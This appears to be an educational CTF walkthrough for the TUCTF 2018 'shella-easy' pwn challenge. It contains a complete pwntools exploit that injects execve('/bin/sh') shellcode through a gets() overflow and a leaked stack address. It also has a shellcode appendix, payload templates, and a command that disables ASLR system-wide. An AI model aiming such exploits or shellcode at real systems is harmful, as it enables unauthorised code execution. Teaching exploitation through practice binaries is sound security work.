# ğŸš€ TU'18 Shellaeasy - Complete Exploitation Guide

![Binary Exploitation](https://img.shields.io/badge/Category-Pwn-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Beginner-green)
![License](https://img.shields.io/badge/License-MIT-blue)

## ğŸ“– Overview

**Shellaeasy** is a beginner-friendly binary exploitation challenge from TUCTF 2018 that introduces fundamental concepts of buffer overflow exploitation and shellcode injection. This challenge serves as an excellent entry point into the world of binary exploitation, teaching essential skills that form the foundation of modern exploit development.

### ğŸ¯ Learning Objectives

By completing this challenge, you will master:

- **Buffer overflow exploitation** techniques
- **Shellcode injection** and execution
- **Information leak** utilization
- **Reverse engineering** with Ghidra
- **Dynamic analysis** with GDB
- **Exploit development** with Python and pwntools

## ğŸ“‹ Table of Contents

1. [Prerequisites &amp; Setup](#-prerequisites--setup)
2. [Challenge Overview](#-challenge-overview)
3. [Solution Walkthrough](#-solution-walkthrough)
4. [Exploit Development](#-exploit-development)
5. [Key Concepts](#-key-concepts)
6. [Further Practice](#-further-practice)
7. [Appendix](#-appendix)

## ğŸ”§ Prerequisites & Setup

### System Requirements

- **OS**: Linux (Ubuntu 20.04/22.04 recommended)
- **Architecture**: x86-64 with 32-bit support
- **RAM**: 4GB minimum
- **Storage**: 5GB free space

### Required Tools Installation

```bash
# Update system and install basic dependencies
sudo apt update && sudo apt upgrade -y
sudo apt install -y build-essential git python3 python3-pip

# Install 32-bit libraries
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install -y libc6:i386 libncurses5:i386 libstdc++6:i386

# Install GDB with GEF (Enhanced Features)
sudo apt install -y gdb
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Install Ghidra (Reverse Engineering Tool)
sudo apt install -y openjdk-11-jdk
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.4_build/ghidra_10.4_PUBLIC_20230928.zip
unzip ghidra_10.4_PUBLIC_20230928.zip
sudo mv ghidra_10.4_PUBLIC /opt/ghidra

# Install pwntools (Exploit Development Framework)
pip3 install pwntools

# Download the challenge
git clone https://github.com/guyinatuxedo/nightmare.git
cd nightmare/modules/06-bof_shellcode/tu18_shellaeasy
chmod +x shella-easy
```

### Verification Checklist

```bash
# Verify all tools are installed correctly
./shella-easy  # Should print an address and wait for input
python3 -c "from pwn import *; print('Pwntools ready!')"
gdb -q ./shella-easy --version
```

## ğŸ® Challenge Overview

### Binary Analysis

```bash
file shella-easy
```

**Output:**

```
shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, 
BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
```

### Security Features Analysis

```bash
checksec --file=shella-easy
```

**Output:**

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

| Protection             | Status                | Impact                |
| ---------------------- | --------------------- | --------------------- |
| **Stack Canary** | âŒ Disabled           | No stack protection   |
| **NX (DEP)**     | âŒ Disabled           | Stack is executable   |
| **PIE**          | âŒ Disabled           | Fixed addresses       |
| **ASLR**         | âŒ Partially disabled | Predictable addresses |

### Initial Interaction

```bash
./shella-easy
```

**Output:**

```
Yeah I'll have a 0xffd01f50 with a side of fries thanks
```

The program then waits for input. This address leak is **crucial** for our exploit.

## ğŸ” Solution Walkthrough

### Step 1: Static Analysis with Ghidra

#### Decompiled Main Function

```c
void main(void)
{
  char input [64];
  
  setvbuf(stdout,(char *)0x0,2,0x14);
  setvbuf(stdin,(char *)0x0,2,0x14);
  printf("Yeah I\'ll have a %p with a side of fries thanks\n",input);
  gets(input);
  /* WARNING: Subroutine does not return */
  exit(0);
}
```

#### Key Vulnerabilities Identified

1. **`gets(input)`**: No bounds checking â†’ Buffer overflow possible
2. **`printf("%p", input)`**: Information leak â†’ We know stack address
3. **No stack protections**: Stack is executable, no canaries

#### Hidden Check in Assembly

```assembly
08048539    CALL       gets
0804853e    ADD        ESP,0x4
08048541    CMP        dword ptr [EBP + -0x8],0xdeadbeef  ; â† HIDDEN CHECK!
08048548    JZ         LAB_08048551
0804854a    PUSH       0x0
0804854c    CALL       exit
LAB_08048551:
08048551    MOV        EAX,0x0
08048556    MOV        EBX,dword ptr [EBP + -0x4]
08048559    LEAVE
0804855a    RET
```

### Step 2: Stack Layout Analysis

```
Higher Memory Addresses
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Return Address    â”‚ â† [ebp+0x4]  (76 bytes from input start)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Saved EBP         â”‚ â† [ebp]
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Saved EBX         â”‚ â† [ebp-0x4]
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Check Variable    â”‚ â† [ebp-0x8]  (64 bytes from input start)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Padding           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  input[63]         â”‚
â”‚  ...               â”‚
â”‚  input[0]          â”‚ â† [ebp-0x48] (Our input starts here)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
Lower Memory Addresses
```

### Step 3: Dynamic Analysis with GDB

#### Finding Exact Offsets

```gdb
gdb ./shella-easy
gefâ¤ b *main+99
gefâ¤ r
# Enter test pattern: AAAABBBBCCCC...
gefâ¤ search-pattern AAAA
# Output: Input starts at 0xffffd020
gefâ¤ info frame
# Output: Return address at 0xffffd06c
```

**Calculations:**

- Input start: `0xffffd020`
- Return address: `0xffffd06c`
- **Offset:** `0x4c = 76 bytes`
- Check variable: `[ebp-0x8] = 0xffffd060`
- **Offset to check:** `0x40 = 64 bytes`

### Step 4: Understanding Shellcode

#### The Shellcode We'll Use

```python
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

**Disassembly:**

```assembly
xor    eax, eax          ; Clear eax (eax = 0)
push   eax               ; Push NULL terminator
push   0x68732f2f        ; Push "//sh"
push   0x6e69622f        ; Push "/bin"
mov    ebx, esp          ; ebx points to "/bin//sh"
push   eax               ; Push NULL
push   ebx               ; Push pointer to string
mov    ecx, esp          ; ecx = argv array
mov    al, 0xb           ; Syscall number for execve
int    0x80              ; Execute syscall
```

**What it does:**

1. Builds the string `/bin//sh\x00` on the stack
2. Creates argument array `["/bin//sh", NULL]`
3. Calls `execve("/bin//sh", ["/bin//sh", NULL], NULL)`
4. Spawns a shell

## ğŸ’¥ Exploit Development

### Complete Exploit Script

```python
#!/usr/bin/env python3
"""
Exploit for TU'18 Shellaeasy Challenge
Vulnerability: Stack buffer overflow in gets()
Technique: Shellcode injection with information leak
"""

from pwn import *

# Configuration
context.arch = 'i386'
context.log_level = 'info'

# Offsets
BUFFER_SIZE = 64
CHECK_OFFSET = 0x40      # 64 bytes
RETURN_OFFSET = 0x4c     # 76 bytes
MAGIC_VALUE = 0xdeadbeef

# Shellcode (23 bytes, NULL-free)
SHELLCODE = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

def exploit():
    # Start the target process
    target = process('./shella-easy')
  
    # Step 1: Parse leaked address
    leak = target.recvline().decode()
    shellcode_addr = int(leak.split("0x")[1].split(" ")[0], 16)
    log.success(f"Leaked address: {hex(shellcode_addr)}")
  
    # Step 2: Build payload
    payload = SHELLCODE                          # 23 bytes
    payload += b"0" * (CHECK_OFFSET - len(SHELLCODE))  # Pad to 64 bytes
    payload += p32(MAGIC_VALUE)                  # Overwrite check variable
    payload += b"1" * 8                          # Pad to return address
    payload += p32(shellcode_addr)               # Overwrite return address
  
    log.info(f"Payload length: {len(payload)} bytes")
  
    # Step 3: Send payload
    target.sendline(payload)
  
    # Step 4: Get interactive shell
    log.success("Shell spawned! Type commands below:")
    target.interactive()

if __name__ == "__main__":
    exploit()
```

### Payload Structure Visualization

```
Offset    Content              Size       Purpose
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
0x00      Shellcode            23 bytes  execve("/bin/sh") code
0x17      Padding              41 bytes  Fill to 64 bytes
0x40      0xdeadbeef          4 bytes   Pass hidden check
0x44      Padding              8 bytes   Fill gap to return address
0x4c      Leaked Address       4 bytes   Redirect execution to shellcode
```

### Running the Exploit

```bash
# Make script executable
chmod +x exploit.py

# Run exploit
python3 exploit.py
```

**Expected Output:**

```
[+] Starting local process './shella-easy': pid 12345
[+] Leaked address: 0xffffd020
[*] Payload length: 80 bytes
[+] Shell spawned! Type commands below:
[*] Switching to interactive mode
$ whoami
yourusername
$ ls
exploit.py  shella-easy
$ exit
[*] Got EOF while reading in interactive
```

## ğŸ§  Key Concepts Explained

### 1. Buffer Overflow Mechanics

A buffer overflow occurs when a program writes more data to a buffer than it can hold. In this challenge:

```c
char input[64];      // Buffer can hold 64 bytes
gets(input);         // Reads unlimited data â†’ OVERFLOW!
```

**Consequences:**

- Overwrites adjacent memory
- Can modify control data (return addresses)
- Leads to arbitrary code execution

### 2. Information Leaks

The program leaks a stack address:

```c
printf("... %p ...", input);  // Prints address of input buffer
```

**Why this matters:**

- Bypasses Address Space Layout Randomization (ASLR)
- We know exactly where our shellcode will be
- Allows precise return address overwriting

### 3. Return Address Hijacking

**Normal execution:**

```
main() â†’ gets() â†’ return to caller
```

**After exploitation:**

```
main() â†’ gets() â†’ return to OUR SHELLCODE
```

The `ret` instruction pops the return address from the stack and jumps there. By overwriting this address, we control program execution.

### 4. Shellcode Design Principles

**Essential characteristics:**

- **NULL-free**: No `\x00` bytes (would terminate strings)
- **Position-independent**: Works anywhere in memory
- **Compact**: Fits in available buffer space
- **Self-contained**: No external dependencies

## ğŸ”§ Troubleshooting Guide

### Common Issues and Solutions

| Issue                                | Symptoms                       | Solution                                                               |
| ------------------------------------ | ------------------------------ | ---------------------------------------------------------------------- |
| **Segmentation fault**         | Program crashes immediately    | Check offset calculations, verify payload length                       |
| **Check fails**                | Program exits without shell    | Ensure `0xdeadbeef` is at correct offset                             |
| **Shell closes immediately**   | Shell spawns then exits        | Use `target.interactive()` for persistent shell                      |
| **Address changes each run**   | Different leaked addresses     | Disable ASLR:`echo 0 \| sudo tee /proc/sys/kernel/randomize_va_space` |
| **Works in GDB but not alone** | Exploit only works in debugger | Addresses differ; adjust slightly or use `env -i`                    |

### Debugging with GDB

```python
# Add to exploit script for debugging
gdb.attach(target, gdbscript='''
    b *main+99
    b *main+102
    b *main+127
    continue
''')
pause()  # Wait for user to attach
```

### Verification Commands

```bash
# Test shellcode independently
python3 -c "
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
print(f'Shellcode length: {len(shellcode)} bytes')
print(f'NULL bytes: {shellcode.count(b\"\\x00\")}')
"

# Test binary with pattern
python3 -c "print('A'*64 + 'B'*4 + 'C'*8 + 'D'*4)" | ./shella-easy
```

## ğŸ“š Further Practice

### Recommended Learning Path

1. **Beginner Challenges**

   - **CSAW'17: Pilot** - Similar buffer overflow
   - **OverTheWire: Narnia** - Progressive difficulty
   - **pwnable.kr: fd, collision** - Basic concepts
2. **Intermediate Challenges**

   - **Return-to-libc** attacks
   - **ROP (Return Oriented Programming)**
   - **Format string vulnerabilities**
3. **Advanced Topics**

   - **Heap exploitation**
   - **Kernel exploitation**
   - **Browser exploitation**

### Additional Resources

#### Books

- **"Hacking: The Art of Exploitation"** by Jon Erickson
- **"The Shellcoder's Handbook"** by Chris Anley et al.
- **"Practical Binary Analysis"** by Dennis Andriesse

#### Online Platforms

- **pwnable.kr** - Korean wargame with progressive challenges
- **pwnable.tw** - Taiwanese challenges (more difficult)
- **ROP Emporium** - Dedicated to ROP exploitation
- **Exploit Education** - Phoenix and Fusion challenges

#### Courses

- **Modern Binary Exploitation** (RPISEC)
- **Binary Exploitation / Memory Corruption** (OpenSecurityTraining)
- **LiveOverflow YouTube Channel** (Practical demonstrations)

### Creating Your Own Challenges

Modify the source code to create variations:

```c
// shellaeasy_v2.c - Added security features
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vulnerable() {
    char buffer[32];  // Smaller buffer
    char canary[8] = "CANARY";  // Stack canary
  
    printf("Buffer at: %p\n", buffer);
    fgets(buffer, 100, stdin);  // Still vulnerable but limited
  
    if(strcmp(canary, "CANARY") != 0) {
        printf("Stack smashing detected!\n");
        exit(1);
    }
  
    if(*(int*)(buffer+40) != 0xcafebabe) {
        exit(0);
    }
}

int main() {
    vulnerable();
    return 0;
}
```

Compile with different protections:

```bash
gcc -m32 -fstack-protector -o challenge challenge.c
```

## ğŸ“– Appendix

### Shellcode Reference

#### Common Shellcodes

```python
# Linux x86 execve("/bin/sh") - 23 bytes
shellcode_23 = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Shorter version - 21 bytes
shellcode_21 = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

# With exit() - 28 bytes
shellcode_exit = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```

#### Shellcode Testing Template

```python
#!/usr/bin/env python3
# test_shellcode.py

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Test for NULL bytes
if b"\x00" in shellcode:
    print("WARNING: Shellcode contains NULL bytes!")
  
# Test length
print(f"Shellcode length: {len(shellcode)} bytes")

# Disassemble (requires capstone)
try:
    from capstone import *
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    for i in md.disasm(shellcode, 0x1000):
        print(f"0x{i.address:x}:\t{i.mnemonic}\t{i.op_str}")
except ImportError:
    print("Install capstone: pip3 install capstone")
```

### GDB Cheat Sheet

```bash
# Basic commands
gdb ./binary          # Start GDB
r                    # Run
r < input.txt        # Run with input
b *0x8048000         # Set breakpoint
c                    # Continue
si                   # Step instruction
ni                   # Next instruction
x/20wx $esp          # Examine stack
info registers       # Show registers
info frame           # Show stack frame

# GEF-specific
pattern create 100   # Create cyclic pattern
pattern offset 0x41414141  # Find offset
vmmap                # Show memory maps
heap                 # Heap analysis
telescope $esp 20    # Smart stack dump
```

### Pwntools Quick Reference

```python
# Process management
p = process('./binary')
p = remote('host', port)
p = gdb.debug('./binary')

# I/O operations
p.send(b'data')
p.sendline(b'data')
p.recv(1024)
p.recvline()
p.recvuntil(b'> ')
p.interactive()

# Packing/unpacking
p32(0xdeadbeef)      # Pack 32-bit
p64(0xdeadbeef)      # Pack 64-bit
u32(b'\xef\xbe\xad\xde')  # Unpack 32-bit

# Utilities
cyclic(100)          # Generate pattern
cyclic_find(0x61616171)  # Find offset
asm('xor eax, eax')  # Assemble
disasm(b'\x31\xc0')  # Disassemble
```

### Linux Syscall Reference (32-bit)

| Syscall | Number | Arguments             |
| ------- | ------ | --------------------- |
| read    | 3      | fd, buffer, count     |
| write   | 4      | fd, buffer, count     |
| open    | 5      | filename, flags, mode |
| close   | 6      | fd                    |
| execve  | 11     | filename, argv, envp  |
| exit    | 1      | status                |

### Common Exploit Patterns

#### Basic Buffer Overflow

```python
payload = shellcode + padding + p32(return_address)
```

#### Format String Exploit

```python
# Leak address
payload = b"%3$p"
leak = int(p.recvline().strip(), 16)

# Write to memory
writes = {address: value}
payload = fmtstr_payload(offset, writes)
```

#### ROP Chain

```python
rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])
payload = padding + rop.chain()
```

## ğŸ† Conclusion

Congratulations! You've successfully:

âœ… **Analyzed** a vulnerable binary using Ghidra
âœ… **Exploited** a buffer overflow vulnerability
âœ… **Crafted** and injected shellcode
âœ… **Bypassed** a hidden security check
âœ… **Achieved** arbitrary code execution

### Ethical Responsibility

Remember to use these skills responsibly:

- Only exploit systems you own or have permission to test
- Contribute to security through responsible disclosure
- Help others learn and improve security practices

### Next Steps

1. **Practice regularly** - Skills deteriorate without use
2. **Join CTF teams** - Learn from others in competitions
3. **Contribute to open source** - Improve security tools
4. **Stay updated** - Follow security research and new techniques

### Final Challenge

Modify the exploit to work when:

1. The buffer size changes
2. NX (Data Execution Prevention) is enabled
3. ASLR is fully enabled
4. A stack canary is present

---

**Happy Hacking!** ğŸš€

*"The only way to learn a new programming language is by writing programs in it." - Dennis Ritchie*

---

*This guide was created based on the comprehensive write-up provided. All credit goes to the original authors and the CTF community.*
